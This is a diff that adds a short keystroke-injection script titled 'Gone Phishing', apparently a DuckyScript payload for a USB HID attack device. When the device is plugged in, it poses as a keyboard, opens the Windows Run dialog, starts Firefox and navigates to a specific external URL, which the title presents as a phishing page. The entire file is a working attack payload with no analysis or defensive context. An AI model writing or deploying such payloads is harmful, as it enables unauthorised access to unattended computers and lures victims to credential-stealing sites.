@@ -1,0 +1,12 @@
+REM Gone Phishing
+ATTACKMODE HID STORAGE
+DELAY 1000
+WINDOWS r
+DELAY 300
+STRING firefox
+DELAY 300
+ENTER
+DELAY 500
+STRING https://dominant-coral-og3hanewqe.edgeone.app/
+DELAY 300
+ENTER
